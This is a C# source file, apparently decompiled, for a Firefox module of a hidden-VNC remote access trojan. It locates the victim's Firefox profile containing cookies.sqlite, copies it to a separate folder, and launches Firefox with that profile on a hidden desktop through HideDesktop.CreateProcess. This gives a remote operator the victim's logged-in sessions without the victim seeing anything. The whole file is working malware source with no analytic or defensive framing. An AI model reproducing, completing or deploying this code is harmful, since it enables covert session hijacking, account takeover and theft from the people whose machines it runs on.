using System;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.Devices;

namespace Plugin.Helper.OpenApp;

internal class FireFox
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\Profiles";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\FireFox Data";

	private static readonly string FilenameFireFox = "C:\\Program Files\\Mozilla Firefox\\firefox.exe";

	private static readonly string FilenameFireFoxX86 = "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe";

	public static void OpenFireFoxBrowser()
	{
		HideDesktop.Load(Plugin.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameFireFox) && !File.Exists(FilenameFireFoxX86))
			{
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					try
					{
						string text = string.Empty;
						string[] directories = Directory.GetDirectories(fileNameUserData);
						foreach (string text2 in directories)
						{
							if (File.Exists(text2 + "\\cookies.sqlite"))
							{
								text = Path.GetFileName(text2);
								break;
							}
						}
						((ServerComputer)PC).FileSystem.CopyDirectory(fileNameUserData + "\\" + text, fileNameUserDataCopy);
					}
					catch (Exception ex)
					{
						Client.Error("Firefox: " + ex.Message);
					}
				}
			}
			catch
			{
			}
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(Plugin.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex2)
		{
			Client.Error("Firefox: " + ex2.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameFireFox))
			{
				text = FilenameFireFox;
			}
			if (File.Exists(FilenameFireFoxX86))
			{
				text = FilenameFireFoxX86;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" -no-remote -profile \"" + fileNameUserDataCopy + "\"", Plugin.hwid, bAppName: false);
				Thread.Sleep(3000);
				HideDesktop.Load(Plugin.HVNCDesktop);
			}
		}
		catch (Exception ex)
		{
			Client.Error("Firefox: " + ex.Message);
		}
	}
}
